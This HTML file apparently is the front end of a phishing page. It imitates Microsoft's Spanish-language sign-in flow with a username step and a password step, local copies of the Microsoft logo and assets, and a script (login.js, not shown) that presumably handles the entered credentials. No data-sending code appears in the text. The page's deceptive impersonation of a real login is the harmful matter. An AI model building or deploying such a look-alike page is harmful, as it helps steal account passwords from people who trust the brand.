<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Inicie sesión en su cuenta de Microsoft</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="../css/login.css" />
  </head>

  <body>
    <section class="auth-container">
      <article id="section_uname">
        <div class="auth-wrapper container">
          <img src="../assets/logo.png" alt="Microsoft" />
          <h2 class="title mb-16 mt-16">Iniciar sesión</h2>
          <form>
            <div class="mb-16">
                <p id="error_username" class="error"></p>
                <input
                  id="input_username"
                  type="text"
                  name="username"
                  class="input"
                  placeholder="Email, celular, o Skype"
                  minlength="4"
                  maxlength="123"
                  required
                />
              </div>
          </form>
          <div>
            <p class="mb-16 fs-13">
              ¿No hay cuenta? <a href="" class="link">¡Crea una!</a>
            </p>
            <p class="mb-16 fs-13">
              <a href="#" class="link"
                >Inicie sesión con una clave de seguridad
                <img src="../assets/question.png" alt="Question img" />
              </a>
            </p>
          </div>
          <div>
            <button class="btn" id="btn_next">Siguiente</button>
          </div>
        </div>
        <div class="opts">
          <p class="has-icon mb-0" style="font-size: 15px">
            <span class="icon"
              ><img src="../assets/key.png" width="30px"
            /></span>
            Opciones de inicio de sesión
          </p>
        </div>
      </article>

      <article id="section_pwd" class="d-none">
        <div class="auth-wrapper container">
          <img src="../assets/logo.png" alt="Microsoft" class="d-block" />
          <div class="identity w-100 mt-16 mb-16">
            <button class="back">
              <img src="../assets/back.png" />
            </button>
            <span id="user_identity">a@b.com</span>
          </div>
          <h2 class="title mb-16">Ingrese la contraseña</h2>
          <form>
            <div class="mb-16">
                <p id="error_password" class="error"></p>
                <input
                  id="input_password"
                  type="password"
                  name="password"
                  class="input"
                  placeholder="Contraseña"
                  minlength="8"
                  maxlength="64"
                  required
                />
              </div>
          </form>
          <div>
            <p class="mb-16">
              <a href="#" class="link fs-13">¿Olvidó su contraseña?</a>
            </p>
            <p class="mb-16 fs-13">
              <a href="#" class="link"
                >Inicie sesión con una clave de seguridad
                <img src="../assets/question.png" alt="Question img" />
              </a>
            </p>
          </div>
          <div>
            <button class="btn" id="btn_sig">Iniciar sesión</button>
          </div>
        </div>
      </article>
    </section>
    <footer class="footer">
      <a href="#">Terminos de Uso</a>
      <a href="#">Privacidad y cookies</a>
      <span>.&nbsp;.&nbsp;.</span>
    </footer>
    <script src="../js/login.js"></script>
  </body>
</html>
